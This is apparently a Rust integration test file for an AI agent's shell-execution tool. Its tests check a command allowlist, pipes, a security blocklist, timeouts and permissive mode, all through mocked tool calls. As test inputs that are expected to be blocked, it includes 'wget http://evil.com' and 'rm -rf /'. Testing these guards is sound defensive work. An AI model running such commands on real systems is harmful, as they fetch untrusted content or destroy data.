mod common;

use common::{
    MockLLMProvider, TestAgentOverrides, create_test_agent_with, text_response, tool_call,
    tool_response,
};
use serde_json::json;
use tempfile::TempDir;

fn shell_overrides(allowed: Vec<&str>) -> TestAgentOverrides {
    TestAgentOverrides {
        allowed_commands: Some(allowed.into_iter().map(String::from).collect()),
        ..Default::default()
    }
}

#[tokio::test]
async fn test_exec_simple_echo() {
    let tmp = TempDir::new().expect("create temp dir");

    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "echo hello world"}),
        )]),
        text_response("Done."),
    ]);
    let calls = provider.calls.clone();

    let agent = create_test_agent_with(provider, &tmp, shell_overrides(vec!["echo"])).await;

    let response = agent
        .process_direct("Run echo", "test:sh1", "telegram", "sh1")
        .await
        .expect("process message");

    assert_eq!(response, "Done.");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(!tool_msg.is_error);
    assert!(tool_msg.content.contains("hello world"));
}

#[tokio::test]
async fn test_exec_blocked_command() {
    let tmp = TempDir::new().expect("create temp dir");

    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "wget http://evil.com"}),
        )]),
        text_response("Blocked."),
    ]);
    let calls = provider.calls.clone();

    // Only allow 'echo' — wget is not allowed
    let agent = create_test_agent_with(provider, &tmp, shell_overrides(vec!["echo"])).await;

    agent
        .process_direct("Download something", "test:sh2", "telegram", "sh2")
        .await
        .expect("process message");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(tool_msg.is_error);
    assert!(tool_msg.content.contains("not in the allowed"));
}

#[tokio::test]
async fn test_exec_pipe_with_allowlist() {
    let tmp = TempDir::new().expect("create temp dir");

    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "echo test | grep test"}),
        )]),
        text_response("Piped."),
    ]);
    let calls = provider.calls.clone();

    let agent = create_test_agent_with(provider, &tmp, shell_overrides(vec!["echo", "grep"])).await;

    agent
        .process_direct("Pipe command", "test:sh3", "telegram", "sh3")
        .await
        .expect("process message");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(!tool_msg.is_error);
    assert!(tool_msg.content.contains("test"));
}

#[tokio::test]
async fn test_exec_pipe_with_blocked_command() {
    let tmp = TempDir::new().expect("create temp dir");

    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "echo test | perl -e 'print'"}),
        )]),
        text_response("Blocked."),
    ]);
    let calls = provider.calls.clone();

    // Allow echo but not perl
    let agent = create_test_agent_with(provider, &tmp, shell_overrides(vec!["echo"])).await;

    agent
        .process_direct("Pipe with perl", "test:sh4", "telegram", "sh4")
        .await
        .expect("process message");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(tool_msg.is_error);
    assert!(tool_msg.content.contains("perl"));
}

#[tokio::test]
async fn test_exec_blocklist_overrides_allowlist() {
    let tmp = TempDir::new().expect("create temp dir");

    // rm -rf / should be blocked by security patterns even if rm is "allowed"
    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "rm -rf /"}),
        )]),
        text_response("Blocked."),
    ]);
    let calls = provider.calls.clone();

    let agent = create_test_agent_with(
        provider,
        &tmp,
        TestAgentOverrides {
            allowed_commands: Some(vec!["rm".to_string()]),
            ..Default::default()
        },
    )
    .await;

    agent
        .process_direct("Delete everything", "test:sh5", "telegram", "sh5")
        .await
        .expect("process message");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(tool_msg.is_error);
    assert!(tool_msg.content.contains("security policy"));
}

#[tokio::test]
async fn test_exec_timeout() {
    let tmp = TempDir::new().expect("create temp dir");

    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "sleep 60"}),
        )]),
        text_response("Timed out."),
    ]);
    let calls = provider.calls.clone();

    let agent = create_test_agent_with(
        provider,
        &tmp,
        TestAgentOverrides {
            allowed_commands: Some(vec!["sleep".to_string()]),
            exec_timeout: Some(1), // 1 second timeout
            ..Default::default()
        },
    )
    .await;

    agent
        .process_direct("Sleep forever", "test:sh6", "telegram", "sh6")
        .await
        .expect("process message");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(tool_msg.is_error);
    assert!(tool_msg.content.contains("timed out") || tool_msg.content.contains("Timed out"));
}

#[tokio::test]
async fn test_exec_empty_allowlist_permits_all() {
    let tmp = TempDir::new().expect("create temp dir");

    let provider = MockLLMProvider::with_responses(vec![
        tool_response(vec![tool_call(
            "tc1",
            "exec",
            json!({"command": "echo permissive mode"}),
        )]),
        text_response("Done."),
    ]);
    let calls = provider.calls.clone();

    // Empty allowlist = no restriction on command names
    let agent = create_test_agent_with(
        provider,
        &tmp,
        TestAgentOverrides {
            allowed_commands: Some(vec![]),
            ..Default::default()
        },
    )
    .await;

    agent
        .process_direct("Echo", "test:sh7", "telegram", "sh7")
        .await
        .expect("process message");

    let recorded = calls.lock().expect("lock recorded calls");
    let second_msgs = &recorded[1].messages;
    let tool_msg = second_msgs.iter().find(|m| m.role == "tool").unwrap();
    assert!(!tool_msg.is_error);
    assert!(tool_msg.content.contains("permissive mode"));
}
